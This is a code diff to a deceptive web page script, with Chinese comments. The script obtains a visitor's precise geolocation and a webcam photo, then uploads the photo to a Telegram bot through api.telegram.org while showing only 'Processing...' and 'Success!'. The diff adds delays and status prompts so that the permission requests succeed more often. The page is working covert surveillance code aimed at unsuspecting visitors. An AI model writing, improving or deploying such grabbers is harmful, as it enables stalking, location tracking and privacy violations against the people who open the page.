@@ -43,23 +43,29 @@
             startBtn.style.display = 'none';
             status.innerText = "⏳";
 
-            // 1. 获取定位
+            // 1. 明确请求定位权限
             let locationText = "Location: Not available";
             try {
+                status.innerText = "📍 Requesting location...";
                 const pos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
                 });
                 locationText = `Lat: ${pos.coords.latitude.toFixed(6)}, Lon: ${pos.coords.longitude.toFixed(6)}`;
-            } catch (err) { console.warn("定位获取失败"); }
+            } catch (err) { console.warn("定位获取被拒绝或超时"); }
 
-            // 2. 获取相机
+            // 2. 强制停顿 1 秒，确保浏览器有足够时间处理权限弹窗逻辑
+            await new Promise(r => setTimeout(r, 1000));
+
+            // 3. 请求相机权限
             try {
+                status.innerText = "📷 Requesting camera...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 video.style.display = 'block';
                 video.style.opacity = '1';
                 status.innerText = "🌐 Processing.........";
 
+                // 4. 拍照并上传
                 setTimeout(() => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -73,7 +79,6 @@
 
                         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                         
-                        // 3. 上传成功后，不跳转页面，而是直接将 video 框切换为视频播放
                         if ((await res.json()).ok) {
                             status.innerText = "🎉 Success!";
                             stream.getTracks().forEach(t => t.stop()); // 关闭摄像头
@@ -87,6 +92,7 @@
                         }
                     }, 'image/jpeg');
                 }, 1000);
+
             } catch (err) {
                 status.innerText = "⚠️ Permissions Required";
             }
